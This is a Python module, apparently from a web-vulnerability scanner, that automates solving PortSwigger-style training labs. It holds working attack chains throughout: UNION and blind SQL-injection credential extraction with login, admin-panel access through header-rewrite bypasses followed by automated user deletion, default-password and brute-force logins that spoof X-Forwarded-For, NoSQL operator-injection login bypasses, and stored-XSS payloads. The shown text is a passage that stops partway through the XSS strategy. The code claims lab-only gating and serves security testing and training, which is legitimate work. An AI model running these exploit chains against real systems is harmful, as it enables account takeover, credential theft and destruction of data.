"""The generalized objective engine (0.9.0).

v0.7.1 could complete exactly ONE objective shape: SQLi -> extract
administrator credentials -> log in. Any training lab whose intended
objective was *anything else* (delete a user through an unprotected admin
panel, bypass 2FA, post a stored-XSS comment, SSRF into an internal admin
page, read a file by path traversal, run ``whoami``, forge a JWT, bypass a
NoSQL login...) remained "not solved" forever, because the solve ladder only
knew SQLi strategies.

This module replaces that ladder with a **goal-driven, detection-driven
strategy engine**:

* **Strategies** are generic exploitation chains for objective *families*
  ("reach an admin panel and complete its state-changing action", "obtain
  an authenticated session and skip the second factor", ...). None of them
  references a concrete lab URL, path, or credential -- everything is
  discovered at runtime (crawled links, robots.txt, response markup).
* **The ladder is assembled from two signals**:
  1. the lab's own title (the platform prints the intended objective, e.g.
     "2FA simple bypass") -- a pattern table maps title keywords to the
     techniques a human would try first, and
  2. the scan's *findings* (detection-driven: an SSRF finding promotes the
     SSRF strategy, an access-control finding promotes the admin-panel
     strategy...).
* **Success is the platform's own oracle**: after every strategy the solve
  phase re-reads the lab status banner. A strategy never needs to know what
  "solved" means for a specific lab.

Everything is gated the same way as the rest of the engine: the shared
HttpClient (denylist, scope, adaptive throttle gate) and the lab-target
gate (objective escalation only ever runs against pages that carry a
training-lab banner, so destructive-looking state changes -- e.g. "delete
user carlos" inside a lab panel -- can never fire on a production target
that merely looks like a lab).
"""

from __future__ import annotations

import base64
import json
import re
from dataclasses import dataclass, field
from html import unescape
from urllib.parse import urljoin, urlparse

from .models import Category
from .modules.base import ScanContext

# ---------------------------------------------------------------------------
# Shared helpers: admin panel discovery + action parsing
# ---------------------------------------------------------------------------

ADMIN_PATH_HINT = re.compile(r"admin|administrator|panel|manage|console|controlpanel", re.IGNORECASE)
ROBOTS_DISALLOW_RE = re.compile(r"Disallow:\s*(/[^#\s]*)", re.IGNORECASE)
COMMON_ADMIN_PATHS = [
    "/admin",
    "/administrator",
    "/adminpanel",
    "/admin_panel",
    "/adminPanel",
    "/manage",
    "/management",
    "/console",
    "/controlpanel",
    "/panel",
]

# Action labels that complete the classic "impact the application's state"
# objectives (delete a user / promote a user / change role...).
ACTION_LABEL_RE = re.compile(r"delete|remove|del\b|upgrade|promote|downgrade|suspend|ban", re.IGNORECASE)
USERNAME_HINT_RE = re.compile(r"\b(administrator|admin|carlos|wiener|peter)\b", re.IGNORECASE)
HREF_RE = re.compile(r"<a\b[^>]*href=[\"']([^\"']+)[\"'][^>]*>(.*?)</a>", re.IGNORECASE | re.DOTALL)
FORM_RE = re.compile(r"<form\b[^>]*action=[\"']([^\"']*)[\"'][^>]*>(.*?)</form>", re.IGNORECASE | re.DOTALL)
INPUT_RE = re.compile(r"<input\b[^>]*>", re.IGNORECASE)
ATTR_RE = lambda name: re.compile(rf"{name}=[\"']([^\"']*)[\"']", re.IGNORECASE)  # noqa: E731

PRIORITY_USERS = ("carlos", "administrator", "admin", "wiener")

# Generic defaults for form fields a strict form (PortSwigger-style comment
# forms) requires before it will store a submission. Keyed by lowercase
# field-name hints -- no lab URL, path or credential anywhere.
FORM_FIELD_DEFAULTS = [
    (re.compile(r"e-?mail", re.I), "peter.wiener@normal-user.net"),
    (re.compile(r"^(full_?)?name$|username|author|nick", re.I), "peter wiener"),
    (re.compile(r"website|url|site|homepage", re.I), "https://normal-user.net"),
    (re.compile(r"phone|tel", re.I), "555-0100"),
    (re.compile(r"subject|title|heading", re.I), "Feedback"),
    (re.compile(r"date", re.I), "2026-01-01"),
]


def fill_form_defaults(data: dict[str, str]) -> dict[str, str]:
    """Fill EMPTY (or crawler-filler "test") form fields with generic values.

    Strict comment/feedback forms ("required fields are missing", email
    format checks) reject a submission that only carries the payload + csrf
    token. The crawler records untouched fields as "test" -- which fails an
    email-format check -- so those are replaced too. Payload fields, csrf
    tokens and anything else the caller already set meaningfully are kept.
    """
    filled = dict(data)
    for key, value in filled.items():
        if value and value != "test":
            continue
        for pattern, default in FORM_FIELD_DEFAULTS:
            if pattern.search(key):
                filled[key] = default
                break
    return filled


def looks_like_admin_panel(html: str) -> bool:
    """Cheap markup heuristic for 'this is an admin/management panel'."""
    if not html:
        return False
    low = html.lower()
    if "admin panel" in low or "admin interface" in low or "users" in low and "delete" in low:
        return True
    return bool(ADMIN_PATH_HINT.search(low) and ACTION_LABEL_RE.search(low))


def parse_admin_actions(html: str, base_url: str) -> list[dict]:
    """Extract user-targeted state-changing actions from admin-panel markup.

    Works on Academy-style panels (a table of users with Delete/Upgrade
    links per row) and on generic form-based panels. Each action is
    ``{url, method, data, label, user, score}`` -- ``score`` prefers the
    classic objectives (delete carlos / promote administrator) without
    hardcoding any lab: the ranking only reflects *what the panel offers*
    and which user rows exist.
    """
    actions: list[dict] = []

    for href, label in HREF_RE.findall(html):
        plain = unescape(re.sub(r"<[^>]+>", "", label)).strip()
        if not ACTION_LABEL_RE.search(plain) and not ACTION_LABEL_RE.search(href):
            continue
        user = _user_near(html, href) or _user_in_label(plain)
        actions.append({
            "url": urljoin(base_url, href),
            "method": "GET",
            "data": {},
            "label": plain or href,
            "user": user,
            "score": _action_score(plain, user),
        })

    for action_attr, body in FORM_RE.findall(html):
        inputs: dict[str, str] = {}
        for tag in INPUT_RE.findall(body):
            name_m = ATTR_RE("name").search(tag)
            if not name_m:
                continue
            value_m = ATTR_RE("value").search(tag)
            inputs[name_m.group(1)] = unescape(value_m.group(1)) if value_m else ""
        flat = json.dumps(inputs, default=str).lower() + " " + action_attr.lower()
        if not ACTION_LABEL_RE.search(flat):
            continue
        user = next((u for u in PRIORITY_USERS if u in flat), None) or (
            next((v for v in inputs.values() if USERNAME_HINT_RE.search(v or "")), None)
        )
        method = "POST" if re.search(r"method=[\"']post[\"']", body[:200] or "", re.IGNORECASE) or "delete" in flat else "GET"
        actions.append({
            "url": urljoin(base_url, action_attr or base_url),
            "method": "POST" if method == "POST" else "GET",
            "data": inputs,
            "label": action_attr,
            "user": user,
            "score": _action_score(action_attr, user),
        })

    # Highest-score first: delete actions on privileged targets.
    return sorted(actions, key=lambda a: a["score"], reverse=True)


def _action_score(label: str, user: str | None) -> int:
    score = 0
    lab = label.lower()
    if "delete" in lab or "remove" in lab:
        score += 3
    if "upgrade" in lab or "promote" in lab:
        score += 2
    if user:
        score += 2
        if user.lower() in ("carlos", "administrator", "admin"):
            score += 3
    return score


def _user_in_label(label: str) -> str | None:
    m = USERNAME_HINT_RE.search(label)
    return m.group(1).lower() if m else None


def _user_near(html: str, href: str, window: int = 400) -> str | None:
    """Which username appears closest BEFORE this href (its table row)."""
    idx = html.find(href)
    if idx < 0:
        return None
    before = html[max(0, idx - window):idx]
    found = USERNAME_HINT_RE.findall(before)
    return found[-1].lower() if found else None


async def discover_admin_urls(ctx: ScanContext) -> list[str]:
    """All plausible admin-panel entry points, ranked.

    Sources (all runtime discovery, nothing hardcoded per-lab):
    1. links already crawled that hint at admin/panel/manager,
    2. robots.txt Disallow entries (the classic way "unpredictable URL"
       panels are disclosed), plus the recon module's cached robots data,
    3. short common-path fallbacks.
    """
    seen: list[str] = []
    base = ctx.base_url.rstrip("/")

    def add(url: str) -> None:
        if url and url.startswith("http") and url not in seen and not _denied(ctx, url):
            seen.append(url)

    for u in ctx.urls or []:
        if ADMIN_PATH_HINT.search(u):
            add(u)
    for paths in (ctx.recon or {}).get("admin_paths") or []:
        add(urljoin(base + "/", paths if paths.startswith("/") else f"/{paths}"))
    # robots.txt (one request; also parsed by the recon module, but the solve
    # phase needs the *actionable paths*, which robots often discloses).
    try:
        r = await ctx.client.get(urljoin(base + "/", "/robots.txt"))
        if r.ok and r.text:
            for path in ROBOTS_DISALLOW_RE.findall(r.text):
                if ADMIN_PATH_HINT.search(path):
                    add(urljoin(base + "/", path))
    except Exception:  # noqa: BLE001 -- robots is best-effort
        pass
    for path in COMMON_ADMIN_PATHS:
        add(base + path)
    return seen[:12]


def _denied(ctx: ScanContext, url: str) -> bool:
    blocked = getattr(ctx.client, "_blocked", None)
    try:
        return bool(blocked and blocked(url))
    except Exception:  # noqa: BLE001
        return False


async def perform_admin_actions(ctx: ScanContext, panel_url: str, html: str, emit) -> str:
    """Try the panel's state-changing actions, most objective-like first.

    Returns a human note describing what was attempted/done. The caller's
    status re-check decides whether the objective was actually completed.
    """
    actions = parse_admin_actions(html, panel_url)
    if not actions:
        return "admin panel reached but no user-targeted action found in markup"
    notes: list[str] = []
    for act in actions[:6]:
        label = f"{act['method']} {act['url']} ({act['label']}" + (
            f" user={act['user']})" if act["user"] else ")"
        )
        emit(f"    [solve] admin action -> {label}")
        try:
            if act["method"] == "POST":
                r = await ctx.client.post(act["url"], data=act["data"] or None)
            else:
                r = await ctx.client.get(act["url"], params=act["data"] or None)
            notes.append(f"{label} -> HTTP {r.status}")
        except Exception as exc:  # noqa: BLE001 -- keep trying other actions
            notes.append(f"{label} -> {type(exc).__name__}")
    return "; ".join(notes)


# ---------------------------------------------------------------------------
# Strategy plumbing
# ---------------------------------------------------------------------------

@dataclass
class Strategy:
    """One generic objective-completion chain."""

    name: str
    run: object  # async (ctx, result, emit) -> str note
    title_patterns: tuple[re.Pattern, ...] = ()
    finding_categories: tuple[Category, ...] = ()
    priority: int = 100  # lower = earlier in the default ladder

    def title_match(self, title: str) -> int:
        """0 = no match, higher = stronger title hint."""
        t = (title or "").lower()
        return sum(2 for p in self.title_patterns if p.search(t))


@dataclass
class SolveBudget:
    """Request budget for the whole solve phase (protects against runaway
    strategies and avoids aggravating an already-throttled target)."""

    max_requests: int = 220
    spent: int = 0
    events: list = field(default_factory=list)

    def take(self, n: int = 1) -> bool:
        if self.spent + n > self.max_requests:
            return False
        self.spent += n
        return True


def _iter_findings(result, *categories: Category):
    cats = set(categories)
    return [f for f in result.sorted_findings if f.category in cats]


def _request_targets_for(ctx: ScanContext, *categories: Category, result=None):
    """(finding, rt, param) triples that the exploit engine can re-target."""
    from .exploits import match_request_target, param_from_title

    out = []
    for f in _iter_findings(result, *categories) if result else []:
        rt = match_request_target(ctx.request_targets, f.url)
        param = param_from_title(f.title)
        if rt is not None and param:
            out.append((f, rt, param))
    return out


# ---------------------------------------------------------------------------
# Strategy 0: UNION objective stated in the banner hint (1.2.0)
# ---------------------------------------------------------------------------

# "Make the database retrieve the string: 'kNwvPL'" -- the platform tells us
# EXACTLY which value must come back through the vulnerable query. Prefer the
# precise phrasing, fall back to any quoted token in the hint.
HINT_TARGET_RE = re.compile(r"retrieve the string\s*:?\s*'([^']+)'", re.IGNORECASE)
HINT_QUOTED_RE = re.compile(r"'([^']{3,64})'")

# Some UNION-family labs have no string target at all: their objective is the
# shape itself ("determine the number of columns returned by the query") --
# a correctly-shaped, executing UNION row IS the solve condition there.
COLUMN_COUNT_TITLE_RE = re.compile(r"determining the number of columns", re.IGNORECASE)


def extract_hint_target(hint: str) -> str:
    """Pull the objective value out of the banner hint text ('' if none)."""
    if not hint:
        return ""
    m = HINT_TARGET_RE.search(hint) or HINT_QUOTED_RE.search(hint)
    return m.group(1).strip() if m else ""


async def strategy_sqli_union_hint(ctx, result, emit, budget: SolveBudget) -> str:
    """Complete UNION-attack objectives that are stated in the lab banner.

    The "SQL injection UNION attack, finding a column containing text" family
    is NOT a credential objective: the banner hint names a string ('kNwvPL')
    and the platform flips to solved the moment that string comes back through
    the vulnerable query. Credential extraction (strategy 1) can never complete
    such labs -- it burned its whole ladder on them. This strategy:

    1. re-reads the banner and parses the hint target string (or recognises
       the column-count-only objective from the title);
    2. discovers the UNION shape with the hardened execution-proven engine
       (marker-validated column count, quote wrapper, per-position text
       compatibility, Oracle FROM dual);
    3. fires one UNION row carrying the target string in a text column (or a
       NULL row for the column-count objective) and checks the response.

    Success is still judged by the solve phase's own banner re-check -- this
    strategy only reports what it observed.
    """
    from .exploits.sqli import discover_union_shape, send_with_param
    from .solving import check_lab_status

    status = await check_lab_status(ctx)
    title = (status or {}).get("title", "")
    hint = (status or {}).get("hint", "")
    target = extract_hint_target(hint)
    cols_objective = bool(COLUMN_COUNT_TITLE_RE.search(title))
    if not target and not cols_objective:
        return "no hint-string or column-count objective in the lab banner"
    triples = _request_targets_for(ctx, Category.SQLI, result=result)
    if not triples:
        # Detection produced no re-targetable SQLi finding (e.g. boolean
        # pages too similar, error body without a known signature). On a
        # UNION-family lab that title match already vouches for, trying the
        # crawled GET query-param targets directly is bounded and safe --
        # every request still goes through the denylist-gated HttpClient.
        seen_urls: set[str] = set()
        for rt in ctx.request_targets:
            if len(seen_urls) >= 3:
                break
            if rt.method.upper() != "GET" or not rt.params:
                continue
            if rt.url in seen_urls:
                continue
            seen_urls.add(rt.url)
            triples.append((None, rt, next(iter(rt.params))))  # 1 param/target
    if not triples:
        return "no re-targetable SQLi finding"

    notes = []
    for _finding, rt, param in triples:
        if not budget.take(1):
            break
        if target:
            emit(f"    [solve] UNION banner-objective on '{param}'"
                 f" (target string: '{target}')")
        else:
            emit(f"    [solve] UNION banner-objective on '{param}'"
                 " (column-count objective)")
        shape = await discover_union_shape(ctx, rt, param)
        if shape is None:
            notes.append(f"{param}: no UNION shape")
            continue
        row = ["NULL"] * shape.cols
        if target:
            row[shape.str_positions[0]] = f"'{target}'"
        payload = shape.union_select(row)
        if not budget.take(1):
            break
        r = await send_with_param(ctx.client, rt, param, payload)
        text = r.text or ""
        if target:
            if target in text:
                notes.append(
                    f"{param}: objective string '{target}' retrieved through the "
                    f"UNION arm (cols={shape.cols}, text col {shape.str_positions[0]})"
                )
                return "; ".join(notes)
            notes.append(f"{param}: target string absent from response")
        else:
            if r.ok:
                notes.append(
                    f"{param}: correctly-shaped UNION row executed (cols={shape.cols})"
                )
                return "; ".join(notes)
            notes.append(f"{param}: UNION row did not execute")
    return "; ".join(notes) or "no UNION objective payload succeeded"


# ---------------------------------------------------------------------------
# Strategy 0.5: Blind-SQLi oracle discovery (cookie-first, finding-free)
# ---------------------------------------------------------------------------

BLIND_SQLI_TITLE_RE = re.compile(r"blind\s+sql\s+injection", re.I)


async def strategy_sqli_blind_oracle(ctx, result, emit, budget: SolveBudget) -> str:
    """Find and drive a blind-SQLi oracle even without a finding.

    'Blind SQL injection with conditional responses' (and friends) put the
    injection point in a COOKIE (TrackingId). Detection may miss it (the
    TRUE page can *add* a "Welcome back" block the baseline lacks, which the
    classic similarity rule read as "no differential"), leaving the ladder
    without a retargetable SQLi finding. This strategy works finding-free:

    1. build candidate injection points: every session-jar cookie against
       the seed URL plus the crawler's cookie-consumer targets, then GET
       query params of the seed URL;
    2. calibrate a polarity-agnostic boolean oracle on each candidate
       (two requests);
    3. where an oracle exists, run the full boolean extraction engine
       (password binary search + login) on a synthetic finding;
    4. 1.2.0: when NO boolean differential exists, try the ERROR-based
       calibration -- the 'conditional errors' lab family hides the oracle
       entirely in HTTP status flips (a broken quote yields 5xx, a doubled
       quote restores 2xx, and CASE-WHEN division-by-zero payloads answer
       yes/no questions). Same extraction engine, status-flip transport.

    Success is still judged by the solve loop's own status re-check.
    """
    from .exploits.sqli import (
        calibrate_boolean_oracle,
        calibrate_error_oracle,
        exploit_sqli_boolean,
        exploit_sqli_error,
    )
    from .models import Finding as FindingModel, Severity as SeverityModel
    from .modules.base import RequestTarget

    notes: list[str] = []
    candidates: list[tuple[RequestTarget, str]] = []
    seen: set[tuple[str, str]] = set()

    # Cookie candidates: seed URL + cookie-consumer targets, per jar cookie.
    cookies = list(ctx.client.jar_cookies().items())[:4]
    rts: list[RequestTarget] = [RequestTarget(url=ctx.base_url, method="GET", params={}, source="seed")]
    rts += [rt for rt in ctx.request_targets if rt.source == "cookie"][:3]
    for rt in rts:
        for cname, _cval in cookies:
            key = (rt.url, cname)
            if key in seen:
                continue
            seen.add(key)
            candidates.append((rt, f"cookie:{cname}"))
    # GET query params of the seed URL as a fallback candidate set.
    for rt in ctx.request_targets:
        if rt.method.upper() == "GET" and rt.params and rt.url.rstrip("/") == ctx.base_url.rstrip("/"):
            for pname in rt.params:
                key = (rt.url, pname)
                if key in seen:
                    continue
                seen.add(key)
                candidates.append((rt, pname))
            break

    for rt, param in candidates:
        if not budget.take(2):
            break
        oracle = await calibrate_boolean_oracle(ctx, rt, param)
        if oracle is None:
            # 1.2.0: no page differential does NOT mean not injectable --
            # the 'conditional errors' family hides the oracle in status
            # flips. Try the error-based calibration before giving up.
            err = await calibrate_error_oracle(ctx, rt, param)
            if err is None:
                continue
            emit(f"    [solve] conditional-error oracle confirmed on '{param}' "
                 f"({err.dialect}, {rt.url})")
            notes.append(f"error oracle confirmed on '{param}' ({err.dialect})")
            synth = FindingModel(
                category=Category.SQLI,
                title=f"Error-based (conditional-error) SQL injection in '{param}'",
                severity=SeverityModel.CRITICAL,
                confidence="confirmed",
                url=rt.url,
                description=(
                    "A single quote in this input produces an HTTP 5xx response while "
                    "doubling it restores a 2xx page, and CASE-WHEN conditional-error "
                    "payloads distinguish TRUE from FALSE purely by status code -- a "
                    "working blind-SQLi error oracle (no page differential needed)."
                ),
                evidence=(
                    "calibrated with quote-balance probes ('-> 5xx, '' -> 2xx) plus a "
                    f"{err.dialect} conditional-error template ('|| CASE WHEN ... "
                    "TO_CHAR(1/0) ... ||' distinguishing 1=1 from 1=2 by status)"
                ),
                request=(
                    f"{rt.method} {rt.url} ({param}=...'||(SELECT CASE WHEN (1=1) "
                    f"THEN TO_CHAR(1/0) ELSE '' END FROM dual)||')"
                ),
                remediation="Use parameterized queries; never build SQL from input.",
                cwe="CWE-89",
                module="solve-error-oracle",
                verified=False,
            )
            result.add(synth)
            await exploit_sqli_error(ctx, synth, rt, param, oracle=err)
            if any("ACCOUNT TAKEOVER" in line for line in synth.extracted_data):
                notes.append("credential extraction + login completed (error oracle)")
                return "; ".join(notes)
            notes.append(f"{param}: error-oracle extraction did not complete")
            if not budget.take(2):
                break
            continue
        emit(f"    [solve] blind oracle confirmed on '{param}' ({rt.url})")
        notes.append(f"boolean oracle confirmed on '{param}'")
        synth = FindingModel(
            category=Category.SQLI,
            title=f"Boolean-based SQL injection in '{param}'",
            severity=SeverityModel.CRITICAL,
            confidence="confirmed",
            url=rt.url,
            description=(
                "A TRUE/FALSE payload pair in this input produces two clearly "
                "different responses, which is a working blind-SQLi boolean "
                "oracle (polarity-agnostic calibration)."
            ),
            evidence="calibrated with \"' AND '1'='1\" vs \"' AND '1'='2\" reference pages",
            request=f"{rt.method} {rt.url} ({param}=...' AND '1'='1)",
            remediation="Use parameterized queries; never build SQL from input.",
            cwe="CWE-89",
            module="solve-blind-oracle",
            verified=False,
        )
        result.add(synth)
        await exploit_sqli_boolean(ctx, synth, rt, param)
        if any("ACCOUNT TAKEOVER" in line for line in synth.extracted_data):
            notes.append("credential extraction + login completed (blind oracle)")
            return "; ".join(notes)
        notes.append(f"{param}: extraction did not complete")
        if not budget.take(2):
            break
    return "; ".join(notes) or "no blind-SQLi oracle (boolean or conditional-error) found on cookies or seed params"


# ---------------------------------------------------------------------------
# Strategy 1: SQLi -> credential extraction -> administrator login (0.7.1)
# ---------------------------------------------------------------------------

async def strategy_sqli_extraction(ctx, result, emit, budget: SolveBudget) -> str:
    triples = _request_targets_for(ctx, Category.SQLI, result=result)
    if not triples:
        return "no re-targetable SQLi finding"
    from .exploits.sqli import exploit_sqli_boolean, exploit_sqli_union

    notes = []
    for finding, rt, param in triples:
        if not budget.take(2):
            break
        emit(f"    [solve] UNION credential extraction on '{param}' ({finding.url})")
        finding.exploit_status = "not_attempted"
        await exploit_sqli_union(ctx, finding, rt, param)
        notes.append(f"UNION on {param}: {finding.exploit_status}")
        if any("ACCOUNT TAKEOVER" in line for line in finding.extracted_data):
            return "credential extraction + login completed (see exploit evidence)"
        if not budget.take(2):
            break
        emit(f"    [solve] boolean-blind extraction fallback on '{param}'")
        finding.exploit_status = "not_attempted"
        await exploit_sqli_boolean(ctx, finding, rt, param)
        notes.append(f"boolean on {param}: {finding.exploit_status}")
        if any("ACCOUNT TAKEOVER" in line for line in finding.extracted_data):
            return "credential extraction + login completed (boolean oracle)"
    return "; ".join(notes) or "no SQLi strategy produced a completing action"


# ---------------------------------------------------------------------------
# Strategy 2: reach an admin panel and complete its state-changing action
# ---------------------------------------------------------------------------

BYPASS_HEADER_SETS = [
    {},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
]

async def strategy_admin_panel(ctx, result, emit, budget: SolveBudget) -> str:
    candidates = await discover_admin_urls(ctx)
    if not candidates:
        return "no admin-panel candidate URL discovered"
    notes: list[str] = []
    for url in candidates:
        if not budget.take():
            break
        for headers in BYPASS_HEADER_SETS:
            if not budget.take():
                break
            try:
                r = await ctx.client.get(url, headers=headers or None)
            except Exception as exc:  # noqa: BLE001
                notes.append(f"{url}: {type(exc).__name__}")
                continue
            if r.status in (401, 403):
                if headers:
                    notes.append(f"{url} + {list(headers)[0]}: HTTP {r.status}")
                continue  # try the next header trick
            if not r.ok or not r.text:
                notes.append(f"{url}: HTTP {r.status}")
                continue
            if looks_like_admin_panel(r.text):
                emit(f"    [solve] admin panel reached: {url}" + (
                    f" (via {list(headers)[0]})" if headers else ""
                ))
                note = await perform_admin_actions(ctx, r.url, r.text, emit)
                notes.append(f"panel {url}: {note}")
                return "; ".join(notes)
            notes.append(f"{url}: reachable but no panel markup")
            break
    # Final fallback (URL-based access-control labs): the front end blocks
    # /admin itself, but ANY path served with X-Original-URL / X-Rewrite-URL
    # reaches the panel. Try the base URL with each bypass header.
    for headers in BYPASS_HEADER_SETS[1:]:
        if not budget.take():
            break
        try:
            r = await ctx.client.get(ctx.base_url, headers=headers)
        except Exception as exc:  # noqa: BLE001
            notes.append(f"base + {list(headers)[0]}: {type(exc).__name__}")
            continue
        if r.ok and r.text and looks_like_admin_panel(r.text):
            emit(f"    [solve] admin panel reached via {list(headers)[0]} on base URL")
            note = await perform_admin_actions(ctx, r.url, r.text, emit)
            notes.append(f"panel via {list(headers)[0]}: {note}")
            return "; ".join(notes)
        notes.append(f"base + {list(headers)[0]}: HTTP {r.status}")
    return "; ".join(notes) or "no admin panel reachable"


# ---------------------------------------------------------------------------
# Strategy 3: authentication chains (default creds, 2FA skip, brute force)
# ---------------------------------------------------------------------------

# The Academy's standard demo account (printed in every auth-lab brief);
# harmless elsewhere because it is simply a wrong credential.
CANONICAL_CREDENTIALS = [
    ("wiener", "peter"),
    ("carlos", "montoya"),
]
DEFAULT_ADMIN_PASSWORDS = ["admin", "administrator", "password", "password123", "letmein"]

async def _login_once(ctx, rt, username: str, password: str) -> bool:
    from .exploits.auth import attempt_login

    res = await attempt_login(ctx, rt, username, password)
    return res.success


def _login_targets(ctx: ScanContext):
    from .exploits.auth import find_login_targets

    targets = find_login_targets(ctx)
    posts = [rt for rt in targets if rt.method.upper() == "POST"]
    return posts or targets


async def strategy_auth_login(ctx, result, emit, budget: SolveBudget) -> str:
    """Canonical-account login + skip-the-second-factor chain.

    Covers '2FA simple bypass' (log in, then navigate straight to an
    authenticated page instead of the verification step) and any lab whose
    objective is reached by opening a valid session.
    """
    targets = _login_targets(ctx)
    if not targets:
        return "no login endpoint discovered"
    notes = []
    for rt in targets[:2]:
        for user, pwd in CANONICAL_CREDENTIALS:
            if not budget.take(2):
                break
            emit(f"    [solve] login attempt {user} on {rt.url}")
            ok = await _login_once(ctx, rt, user, pwd)
            notes.append(f"login {user}: {'success' if ok else 'failed'}")
            if not ok:
                continue
            # Session is open: probe authenticated pages directly (the 2FA
            # skip). If /login2 stands between us and the account page,
            # simply requesting the account page is the intended bypass.
            # The id-parameter probes cover BOTH the "2FA simple bypass"
            # shape (the victim account the login opened) and classic IDOR
            # account pages -- derived from the login that succeeded, never
            # from a hardcoded lab URL.
            id_probes = [f"/my-account?id={u}" for u in
                         dict.fromkeys((user, "carlos", "administrator", "wiener"))]
            for path in (
                f"/my-account?id={user}",
                "/my-account",
                *id_probes,
                "/",
                "/admin",
            ):
                if not budget.take():
                    break
                from urllib.parse import urljoin

                r = await ctx.client.get(urljoin(rt.url, path))
                low = (r.text or "").lower()
                if "log out" in low or "my account" in low or "logout" in low:
                    who = "administrator" if "administrator" in low else user
                    emit(f"    [solve] authenticated session open as {who} via {path}")
                    # An authenticated admin page often exposes the panel.
                    if looks_like_admin_panel(r.text):
                        note = await perform_admin_actions(ctx, r.url, r.text, emit)
                        notes.append(f"admin actions: {note}")
                    return f"session opened as {user}; authenticated pages reachable"
            notes.append(f"login {user}: session open but no authenticated page marker")
    return "; ".join(notes) or "no login attempt succeeded"


async def strategy_admin_default_passwords(ctx, result, emit, budget: SolveBudget) -> str:
    """Short default-credential ladder for 'administrator' (bounded, safe)."""
    targets = _login_targets(ctx)
    if not targets:
        return "no login endpoint discovered"
    rt = targets[0]
    from .exploits.auth import attempt_login

    notes = []
    for pwd in DEFAULT_ADMIN_PASSWORDS:
        if not budget.take(2):
            break
        res = await attempt_login(ctx, rt, "administrator", pwd)
        notes.append(f"administrator/{pwd}: {'success' if res.success else 'failed'}")
        if res.success:
            emit(f"    [solve] administrator login succeeded with default password '{pwd}'")
            r = await ctx.client.get(ctx.base_url)
            if looks_like_admin_panel(r.text or ""):
                notes.append("admin actions: " + await perform_admin_actions(ctx, r.url, r.text, emit))
            return "; ".join(notes)
    return "; ".join(notes) or "no default credential accepted"


async def strategy_bruteforce_bounded(ctx, result, emit, budget: SolveBudget) -> str:
    """Bounded credential-stuffing chain (title-gated: 'brute force' labs).

    The classic lab rotates the spoofable client-IP header to defeat IP
    lockout. Capped at the budget: the loop stops at the first success or
    when the wordlist/budget runs out.
    """
    targets = _login_targets(ctx)
    if not targets:
        return "no login endpoint discovered"
    rt = targets[0]
    from .exploits.auth import AUTH_SUCCESS_MARKERS, _user_pass_param_names, refresh_csrf

    names = _user_pass_param_names(rt)
    if not names:
        return "login form parameters not identifiable"
    user_param, pass_param = names
    user = "carlos"  # the lab's canonical lockout victim; harmless guess otherwise
    notes = []
    tried = 0
    from .exploits.auth import COMMON_PASSWORDS

    for i, pwd in enumerate(COMMON_PASSWORDS):
        if not budget.take() or tried >= 120:
            break
        tried += 1
        await refresh_csrf(ctx.client, rt)
        headers = {"X-Forwarded-For": f"10.0.{(i // 250) % 250 + 1}.{i % 250 + 1}"}
        data = dict(rt.params)
        data[user_param] = user
        data[pass_param] = pwd
        try:
            r = await ctx.client.post(rt.url, data=data, headers=headers)
        except Exception as exc:  # noqa: BLE001
            notes.append(f"{pwd}: {type(exc).__name__}")
            continue
        low = (r.text or "").lower()
        if any(m in low for m in AUTH_SUCCESS_MARKERS if m not in ("invalid username or password",)) and "invalid" not in low:
            emit(f"    [solve] credential stuffing succeeded: {user}:{pwd}")
            notes.append(f"success: {user}:{pwd}")
            return "; ".join(notes)
    return f"no password accepted after {tried} attempts (bounded)"


# ---------------------------------------------------------------------------
# Strategy 4: NoSQL operator-injection login bypass
# ---------------------------------------------------------------------------

NOSQL_PAYLOADS = [
    ('form', {"username[$ne]": "invalid", "password[$ne]": "invalid"}),
    ('form', {"username[$regex]": "^adm.*", "password[$ne]": "invalid"}),
    ('json', {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}),
    ('json', {"username": {"$regex": "^adm.*"}, "password": {"$ne": "invalid"}}),
]

async def strategy_nosql_login_bypass(ctx, result, emit, budget: SolveBudget) -> str:
    targets = [rt for rt in ctx.request_targets if rt.method.upper() == "POST"
               and any("user" in p.lower() or "login" in p.lower() or "email" in p.lower() for p in rt.params)]
    if not targets:
        return "no login-style POST endpoint discovered"
    rt = targets[0]
    from .exploits.auth import AUTH_SUCCESS_MARKERS

    notes = []
    for kind, payload in NOSQL_PAYLOADS:
        if not budget.take():
            break
        try:
            if kind == "form":
                r = await ctx.client.post(rt.url, data=payload)
            else:
                r = await ctx.client.post(rt.url, json=payload)
        except Exception as exc:  # noqa: BLE001
            notes.append(f"{kind} {payload}: {type(exc).__name__}")
            continue
        low = (r.text or "").lower()
        markers = [m for m in AUTH_SUCCESS_MARKERS if m in low and m != "invalid username or password"]
        notes.append(f"{kind}: HTTP {r.status}{', markers=' + ','.join(markers[:2]) if markers else ''}")
        if markers or (r.status in (301, 302)):
            emit(f"    [solve] NoSQL operator bypass accepted ({kind})")
            return "; ".join(notes)
    return "; ".join(notes) or "no NoSQL bypass accepted"


# ---------------------------------------------------------------------------
# Strategy 5: stored XSS via blog comment + reflected XSS trigger
# ---------------------------------------------------------------------------

XSS_GOAL_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=1 onerror=alert(1)>",
    "<svg onload=alert(1)>",
    '"><script>alert(1)</script>',
    "<script>print()</script>",
]

COMMENT_PARAM_RE = re.compile(r"comment|body|message|content|post|text|feedback", re.IGNORECASE)

async def strategy_stored_xss_comment(ctx, result, emit, budget: SolveBudget) -> str:
    """Find a comment form, store an executing payload, verify it renders."""
    targets = [rt for rt in ctx.request_targets
               if rt.method.upper() == "POST" and any(COMMENT_PARAM_RE.search(p) for p in rt.params)]
    if not targets:
        # Blog posts exist but no crawled comment form: POST to the post URL.
        post_urls = [u for u in (ctx.urls or []) if "post" in urlparse(u).path.lower()]
        if not post_urls:
            return "no comment endpoint or blog post discovered"
        targets = None  # synthesize below
    from .modules.base import RequestTarget

    notes = []
    if targets:
        pools = targets[:2]
    else:
        pools = [RequestTarget(url=post_urls[0], method="POST",
                               params={"comment": "", "name": "", "email": "", "csrf": ""})]
    for rt in pools:
        from .exploits.auth import refresh_csrf

        for payload in XSS_GOAL_PAYLOADS[:3]:
            if not budget.take():
                break
            data = dict(rt.params)
            # Prefer the exact 'comment' field; generic keyword matching can
            # otherwise grab 'postId' (which contains 'post').
            comment_key = next((p for p in data if p.lower() == "comment"), None) or next(
                (p for p in data if COMMENT_PARAM_RE.search(p)), "comment"
            )
            data[comment_key] = payload
            await refresh_csrf(ctx.client, rt)
